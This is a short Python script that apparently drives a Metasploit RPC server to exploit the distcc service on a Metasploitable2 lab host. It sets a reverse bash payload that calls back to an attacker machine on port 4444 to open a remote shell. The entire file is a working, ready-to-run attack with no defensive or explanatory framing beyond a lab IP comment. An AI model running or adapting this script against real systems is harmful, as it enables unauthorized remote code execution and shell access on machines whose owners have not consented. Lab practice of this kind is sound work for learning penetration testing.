from pymetasploit3.msfrpc import MsfRpcClient
import time
import socket

def test_msf_reverse_shell():
    print("[*] Connecting to Metasploit RPC...")

    try:
        client = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False)
    except Exception as e:
        print(f"[!] Failed to connect to Metasploit RPC: {e}")
        return

    target_ip = '192.168.109.182'  # Metasploitable2
    lhost = '192.168.109.130'      # Your Kali IP
    lport = 4444                   # Listener port

    # Set exploit and reverse shell payload
    exploit = client.modules.use('exploit', 'unix/misc/distcc_exec')
    payload = client.modules.use('payload', 'cmd/unix/reverse_bash')

    exploit['RHOSTS'] = target_ip
    payload['LHOST'] = lhost
    payload['LPORT'] = lport

    print(f"[*] Launching reverse_bash exploit against {target_ip}...")
    result = exploit.execute(payload=payload)
    print("[*] Exploit result:", result)
    print("[*] Shell should connect back shortly...")

if __name__ == "__main__":
    test_msf_reverse_shell()






